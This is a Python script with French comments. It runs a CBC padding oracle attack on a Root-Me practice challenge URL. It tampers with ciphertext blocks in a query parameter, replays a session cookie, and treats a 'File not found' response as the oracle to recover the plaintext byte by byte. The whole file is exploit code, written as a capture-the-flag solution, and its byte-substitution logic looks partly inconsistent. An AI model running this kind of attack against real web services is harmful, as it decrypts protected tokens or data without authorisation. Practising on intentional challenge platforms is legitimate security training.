#from selenium import webdriver
import sys
import requests

# Lancer Safari 
#driver = webdriver.Safari()

# URL de base
base_url = "http://challenge01.root-me.org/realiste/ch12/index.aspx"

# Séquence à détecter dans la réponse
target_sequence = "File not found"  

#On la concatène devant original

original = "2FF5CE2CC953CB34E6C3D2ADB00A6BA40959A8C2F81BC2E70DB268F882F0351613E22C0B42BAB40FE9C2C952288CE25579C35DB94476B12CA5F235DA6F27FE6E"

            
# Découper la chaîne d'origine en blocs de 32 caractères (soit 16 octets)
block_size = 32
original_blocks = [original[i:i+block_size] for i in range(0, len(original), block_size)]
print(f"Blocks : {original_blocks}")

# valeurs de test
test_values = [format(i, '02X') for i in range(256)]

result = ""

n = len(original_blocks) -1

for k in range(n, 0, -1):
    print("déchiffrage du block ", k)
    # blocks est une copie de original_blocks
    blocks = original_blocks.copy()
    # Tester les valeurs
    for i in range(16):
        
        # On sépare le block "blocks[2]" en deux parties: une avant le 14-ième caractère et une après
        block1 = blocks[k-1][:2*(16-i)-2]
        block2 = blocks[k-1][2*(16-i)-2:] #les 2 premiers caractères de block2 sont destinés à être remplacés par le caractère testé
        original_bit = block2[:2]
        trouve = False
        if i == 0:
            block2 = "00"
        for value in test_values:
            if value == '00':
                # On remplace les 2 premiers caractères de block2 par la valeur testée
                block2 = value + block2[2:]
            
            blocks[k-1] = block1 + block2
            
            # On reconstitue la chaîne de 128 caractères
            test = "".join(blocks[k-1:k+1])

            sys.stdout.write(f"\rTest du bit {i+1} : {block1}\033[91m{block2[:2]}\033[92m{block2[2:]}\033[96m{blocks[k]}\033[0m") 
            sys.stdout.flush()

            # Construire l'URL avec le paramètre c
            test_url = f"{base_url}?c={test}"
            #driver.get(test_url)
            response = requests.get(test_url, cookies={'PHPSESSID': sys.argv[1]}).text

        
            #time.sleep(0.05)  # Pause pour charger la page
            
            # Vérifier si la séquence cible est dans la page
            if target_sequence in response:
                print()
                bit_clair = format(int(value, 16) ^ int(original_bit, 16) ^ (i+1), '02X')
                #on fait le xor entre value, original_bit et i+1, tous en hexadécimal
                result = bit_clair + result
                print(f"Valeur trouvée pour le bit {i+1} du bloc {k}: {bit_clair}")
                #on crée un block avec i+1 au format hexadécimal répété i+1 fois
                newblock = format(i+1, '02X') * (i+1)
                #on crée un autre block avec i+2 au format hexadécimal répété i+1 fois
                newblock2 = format(i+2, '02X') * (i+1)
                #on fait le xor entre newblock et newblock2
                newblock = format(int(newblock, 16) ^ int(newblock2, 16), '02X')
                #on remplace block2 par newblock xor block2
                block2 = format(int(newblock, 16) ^ int(block2, 16), '02X')
                #on rajoute des zéros à gauche si nécessaire
                block2 = block2.zfill(2*(i+1))
                blocks[k-1] = block1 + block2

                break
            else:
                #on calcule value + 1 en hexadécimal
                value = format(int(value, 16) + 1, '02X')
                #on remplace les 2 premiers caractères de block2 par value
                block2 = value + block2[2:]


# Fermer le navigateur
#driver.quit()

print(f"Résultat : {result}")
#on convertit le résultat en texte
result = bytes.fromhex(result).decode('utf-8')
print(f"Résultat en texte : {result}")
    

